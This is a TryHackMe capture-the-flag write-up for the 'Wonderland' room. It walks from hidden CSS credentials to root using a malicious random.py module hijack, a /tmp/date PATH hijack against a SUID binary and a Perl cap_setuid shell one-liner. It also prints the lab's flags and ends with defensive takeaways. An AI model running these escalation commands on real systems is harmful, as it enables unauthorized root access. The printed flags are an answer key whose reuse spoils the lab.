---
layout: default
title: Wonderland
---

| Field      | Details                                               |
|------------|-------------------------------------------------------|
| Room       | [Wonderland](https://tryhackme.com/room/wonderland)   |
| Platform   | TryHackMe                                             |
| Difficulty | Medium                                                |
| Category   | Web Exploitation, Linux PrivEsc                       |
| Tags       | Python Library Hijacking, PATH Hijacking, Linux Capabilities, SUID |

---

## Overview

Alice has fallen down the rabbit hole and landed on a box with two flags, zero obvious paths to root and a level of thematic commitment that makes you feel bad about hacking it. Everything here is upside down: the user flag is in /root and the root flag is in Alice's home directory. The room is a multi-hop privilege escalation chain that takes you through four users (alice → rabbit → hatter → root) via Python library hijacking, a SUID binary with an unqualified PATH call and a Perl capability exploit.

From a blue team perspective this room is a masterclass in the cascading damage that follows a single credential leak. One hidden HTML credential handed to us over HTTP becomes full root access through a series of misconfigurations that each would have been unremarkable in isolation.

---

## Enumeration

### Port Scan

```
nmap -sC -sV <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Golang net/http server
```

Two ports. SSH is parked until we find credentials. HTTP is where we go first.

```
Attack surface
┌──────────────────────────────────────┐
│  Internet                            │
│         ┌──────────┐                 │
│         │  Port 80 │◄── Start here   │
│         │  HTTP    │                 │
│         └──────────┘                 │
│         ┌──────────┐                 │
│         │  Port 22 │◄── Later        │
│         │  SSH     │                 │
│         └──────────┘                 │
└──────────────────────────────────────┘
```

### Web Reconnaissance

The landing page greets us with a white rabbit, some flavour text and a title that says "Follow the White Rabbit." Checking the page source yields nothing immediately useful. robots.txt is also empty. Time to fuzz.

### Directory Fuzzing

```bash
gobuster dir -u http://<TARGET_IP>/ -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster surfaces a `/r` directory. Visiting it hints to keep going, which turns out to be very literal advice. Appending one letter at a time spells out the whole word:

```
http://<TARGET_IP>/r/
http://<TARGET_IP>/r/a/
http://<TARGET_IP>/r/a/b/
http://<TARGET_IP>/r/a/b/b/
http://<TARGET_IP>/r/a/b/b/i/
http://<TARGET_IP>/r/a/b/b/i/t/
```

The final page says "Open the door and Enter the wonderland" and shows an image of Alice. Inspecting the page source reveals credentials styled with `display: none` — invisible in the browser but very visible in DevTools.

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

```
Credential exposure chain
┌──────────────────────────────────────────────────────┐
│  Directory walk /r/a/b/b/i/t/  ──►  final page       │
│  View page source               ──►  hidden CSS creds │
│                                                       │
│  alice:HowDothTheLittleCrocodileImproveHisShiningTail │
└──────────────────────────────────────────────────────┘
```

---

## Initial Access

### SSH as Alice

With no login form on the site, the credentials go straight to SSH:

```bash
ssh alice@<TARGET_IP>
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

We are in as `alice`. Listing the home directory is immediately disorienting:

```bash
ls /home/alice
# root.txt
# walrus_and_the_carpenter.py
```

The room warned us: everything is upside down. `root.txt` is sitting here but we cannot read it yet. If the root flag is in the user folder, the user flag is presumably in `/root`:

```bash
cat /root/user.txt
# thm{"Curiouser and curiouser!"}
```

That tracks.

---

## Privilege Escalation

The escalation chain here is a relay race with four legs. Each user passes the baton to the next through a different class of misconfiguration.

```
Escalation chain
┌─────────────────────────────────────────────────────────────────┐
│  alice ──► rabbit ──► hatter ──► root                           │
│    │           │          │         │                            │
│    │           │          │         └─ Perl cap_setuid+ep       │
│    │           │          └─ password.txt in home dir           │
│    │           └─ teaParty SUID + PATH hijack (date)            │
│    └─ sudo Python3 as rabbit + Python library hijacking          │
└─────────────────────────────────────────────────────────────────┘
```

### alice → rabbit: Python Library Hijacking

```bash
sudo -l
```

```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Alice can run a specific Python script as `rabbit`. Reading the script shows it imports the `random` module and uses `random.choice()` to print ten random lines from a poem. Python resolves imports by checking the current working directory before the system library paths. Since we have write access to `/home/alice`, we can drop a malicious `random.py` there and have it load instead of the real one.

```python
# /home/alice/random.py
import os

def choice(a):
    os.system("/bin/bash")
```

Then execute the script as `rabbit`:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The poem never gets a chance to be recited. We get a shell as `rabbit`.

### rabbit → hatter: SUID Binary + PATH Hijacking

```bash
ls /home/rabbit
# teaParty
```

A SUID binary owned by root with the setuid bit set for `hatter`. Running it prints:

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 01 Jan 2026 13:00:00 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

The binary is calling the `date` command without an absolute path. The shell resolves unqualified commands through `$PATH` from left to right, so if we prepend a directory we control, our fake `date` runs instead of `/bin/date`.

```bash
# Create a malicious date binary
echo "/bin/bash" > /tmp/date
chmod +x /tmp/date

# Prepend our directory to PATH
export PATH=/tmp:$PATH

# Execute the SUID binary
./teaParty
```

The binary runs our `date`, which spawns a shell. We land as `hatter`.

```bash
ls /home/hatter
# password.txt

cat /home/hatter/password.txt
# WhyIsARavenLikeAWritingDesk?
```

Hatter left their plaintext password in a file in their own home directory. SSH in for a stable shell:

```bash
ssh hatter@<TARGET_IP>
# Password: WhyIsARavenLikeAWritingDesk?
```

### hatter → root: Perl Capabilities Exploit

Hatter has no interesting sudo rights. Time to enumerate capabilities:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mawk = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

Perl has `cap_setuid+ep` set, meaning it can set its own UID to 0 without being root first. GTFOBins covers this exactly:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

```bash
whoami
# root
```

Root. Now we can read the flag that was taunting us from the beginning:

```bash
cat /home/alice/root.txt
# thm{Twinkle, twinkle, little bat! How I wonder what you're at!}
```

---

## Attack Path Summary

```
[Recon]
  │
  └─ Directory walk /r/a/b/b/i/t/ ──► hidden CSS creds in page source
         │
[Initial Access]
  │
  └─ SSH as alice ──► user flag at /root/user.txt
         │
[Priv Esc: alice → rabbit]
  │
  └─ sudo -l ──► python3.6 as rabbit
  └─ Python library hijack (random.py) ──► shell as rabbit
         │
[Priv Esc: rabbit → hatter]
  │
  └─ teaParty SUID binary ──► calls date without absolute path
  └─ PATH hijack (/tmp/date → /bin/bash) ──► shell as hatter
  └─ /home/hatter/password.txt ──► SSH creds for stable shell
         │
[Priv Esc: hatter → root]
  │
  └─ getcap ──► /usr/bin/perl = cap_setuid+ep
  └─ perl POSIX::setuid(0) ──► root shell
  └─ cat /home/alice/root.txt ──► root flag
```

---

## Flags

| # | Question                        | Answer                                                      |
|---|---------------------------------|-------------------------------------------------------------|
| 1 | Obtain the flag in user.txt     | `thm{"Curiouser and curiouser!"}`                           |
| 2 | Escalate privileges, what is the flag in root.txt? | `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}` |

---

## Blue Team Takeaways

**Credentials Hidden with CSS Are Not Hidden**
Styling an element with `display: none` removes it from the rendered page but not from the HTML. Any browser developer tools or `view-source:` request retrieves it instantly. Credentials must never be embedded in client-side code regardless of how they are styled. Secret scanning in CI/CD pipelines (truffleHog, gitleaks) catches this before it reaches production.

**Python Library Hijacking via Relative Imports**
When Python resolves an `import random` statement it checks the current working directory before the system library path. If an attacker controls the working directory of a privileged script, they control which module loads. Mitigations include using absolute import paths where possible, running scripts from directories the executing user does not own and validating module integrity at load time. The `sudo` rule granting execution as another user amplified what would otherwise be a low-impact issue into a lateral move.

**SUID Binaries with Unqualified PATH Calls**
The `teaParty` binary called `date` rather than `/bin/date`. Any SUID binary that calls external programs without absolute paths is vulnerable to PATH hijacking: an attacker prepends a controlled directory to `$PATH` and the binary executes their payload with elevated privileges. Binary hardening checklist items: strip SUID bits that are not strictly necessary, use absolute paths for all external command calls and consider compiling with restricted environment defaults.

**Linux Capabilities as a Privilege Escalation Vector**
`cap_setuid+ep` on Perl grants a single-line root shell with no further conditions. Capabilities are often overlooked during hardening audits because they do not appear in standard permission listings. `getcap -r /` should be part of every Linux baseline review and hardening scripts like CIS Benchmark enforce removal of unnecessary capability assignments. Monitoring for capability changes at runtime (auditd rules on `setcap`) catches this class of misconfiguration before it is exploited.

---

*We're all mad here.*
